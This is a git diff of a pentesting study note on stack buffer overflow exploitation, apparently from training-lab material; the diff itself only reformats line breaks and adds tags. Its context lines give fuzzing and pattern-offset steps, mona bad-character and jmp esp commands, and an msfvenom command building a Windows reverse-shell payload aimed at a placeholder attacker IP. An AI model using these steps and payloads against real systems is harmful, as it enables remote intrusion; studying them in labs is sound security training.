@@ -2,6 +2,8 @@
 title: 3 - Buffer Overflow
 summary: Gaining Access step – a note for Buffer Overflows.
 description: Gaining Access step – a note for Buffer Overflows.
+tags:
+  - buffer-overflow
 ---
 
 # Memory Architecture
@@ -25,11 +27,11 @@ Source: TCM Security
 ---
 
  > 
- > **<font color=red>python -c "print('A' \*</font> 40 <font color=red>+ '</font>\\xef\xbe\xad\xde<font color=red>')"</font>**</br>
+ > **<font color=red>python -c "print('A' \*</font> 40 <font color=red>+ '</font>\\xef\xbe\xad\xde<font color=red>')"</font>**<br>
  > Print payload with overflow and value to inject.
 
  > 
- > **<font color=red>cat</font> myPayloadFile <font color=red>- |</font> vulnerableBinary**</br>
+ > **<font color=red>cat</font> myPayloadFile <font color=red>- |</font> vulnerableBinary**<br>
  > Use `-` to hang after succefull buffer overflow. 
 
 # THM Method
@@ -41,7 +43,7 @@ Source: TCM Security
 ### 1 - Fuzzing
 
  > 
- > **<font color=red>1_fuzzer.py</font>**</br>
+ > **<font color=red>1_fuzzer.py</font>**<br>
 
 ````py
 #!/usr/bin/env python3
@@ -80,7 +82,7 @@ while True:
 #### Method 1: Manual
 
  > 
- > **<font color=red>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l</font> 3000**</br>
+ > **<font color=red>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l</font> 3000**<br>
  > Create chars to find EIP (maki it 400 bytes longer than the string that crashed the server).
 
  > 
@@ -90,7 +92,7 @@ while True:
  > Re-run the program in Immunity.
 
  > 
- > **<font color=red>2_exploit.py</font>**</br>
+ > **<font color=red>2_exploit.py</font>**<br>
 
 ````py
 import socket
@@ -124,7 +126,7 @@ except:
  > ![exploit-buffer_overflow-eip_manual.png](../../attachments/exploit-buffer_overflow-eip_manual.png)
 
  > 
- > **<font color=red>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l</font> 3000 <font color=red>-q</font> 386F4337**</br>
+ > **<font color=red>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l</font> 3000 <font color=red>-q</font> 386F4337**<br>
  > Return the exact offset.
 
  > 
@@ -151,12 +153,12 @@ Immunity : !mona findmsp -distance 2400
 #### Method 1: Manual
 
  > 
- > **<font color=red>!mona bytearray -b "</font>\\x00<font color=red>"</font>**</br>
+ > **<font color=red>!mona bytearray -b "</font>\\x00<font color=red>"</font>**<br>
  > In Immunity
 
  > 
  > <font color=red>
-**3_gen_badchars.py**</font></br>
+**3_gen_badchars.py**</font><br>
 
 ````py
 for x in range(1, 256):
@@ -168,7 +170,7 @@ print()
  > Take output form `3_gen_badchars.py` and put il in "payload" variable in `2_exploit.py`.
 
  > 
- > **<font color=red>2_exploit.py</font>**</br>
+ > **<font color=red>2_exploit.py</font>**<br>
 
  > 
  > Follow EIP in Immunity.
@@ -187,15 +189,15 @@ print()
 #### Method 2: Mona
 
  > 
- > **<font color=red>!mona config -set workingfolder</font> c:\mona**</br>
+ > **<font color=red>!mona config -set workingfolder</font> c:\mona**<br>
  > Set where mona will save data.
 
  > 
- > **<font color=red>!mona bytearray -cpb</font> “\x00”**</br>
+ > **<font color=red>!mona bytearray -cpb</font> “\x00”**<br>
  > Generate Bytearray
 
  > 
- > **<font color=red>!mona compare -f</font> bytearray.bin <font color=red>-a</font> ESP-ADDR**</br>
+ > **<font color=red>!mona compare -f</font> bytearray.bin <font color=red>-a</font> ESP-ADDR**<br>
  > Find bad chars.
 
 ![exploit-buffer_overflow-bad_chars_mona.png](../../attachments/exploit-buffer_overflow-bad_chars_mona.png)
@@ -203,7 +205,7 @@ print()
 Do it again adding bad chars :
 
  > 
- > **<font color=red>!mona bytearray -cpb</font> "\x00\x07\x08\x2e\x2f\xa0\xa1"**</br>
+ > **<font color=red>!mona bytearray -cpb</font> "\x00\x07\x08\x2e\x2f\xa0\xa1"**<br>
  > Generate Byte array.
 
 ---
@@ -219,7 +221,7 @@ Do it again adding bad chars :
 #### Method 2: Mona
 
  > 
- > **<font color=red>!mona jmp -r esp -cpb </font>"\x00\x07\x08\x2e\x2f\xa0\xa1"**</br>
+ > **<font color=red>!mona jmp -r esp -cpb </font>"\x00\x07\x08\x2e\x2f\xa0\xa1"**<br>
  > Return all "jmp esp" (specify bad chars after -cpb).
 
 ![exploit-buffer_overflow-jump_point_mona.png](../../attachments/exploit-buffer_overflow-jump_point_mona.png)
@@ -230,17 +232,17 @@ Do it again adding bad chars :
 
 
  > 
- > **<font color=red>msfvenom -p</font> windows/shell_reverse_tcp <font color=red>LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>EXITFUNC=thread -f</font> c <font color=red>-b "</font>\\x00\x07\x08\x2e\x2f\xa0\xa1<font color=red>"</font>**</br>
+ > **<font color=red>msfvenom -p</font> windows/shell_reverse_tcp <font color=red>LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>EXITFUNC=thread -f</font> c <font color=red>-b "</font>\\x00\x07\x08\x2e\x2f\xa0\xa1<font color=red>"</font>**<br>
  > Gen Reverse Shell in Shellcode (specify bad chars).
 
 #### Flags
 
  > 
- > **<font color=red>-b "</font>\\x00<font color=red>"</font>**</br>
+ > **<font color=red>-b "</font>\\x00<font color=red>"</font>**<br>
  > Specify bad characters (always put at least null byte).
  > 
- > **<font color=red>-f</font> c**</br>
+ > **<font color=red>-f</font> c**<br>
  > File Type (here it's c file).
  > 
- > **<font color=red>-a</font> x86**</br>
+ > **<font color=red>-a</font> x86**<br>
  > Architecture.
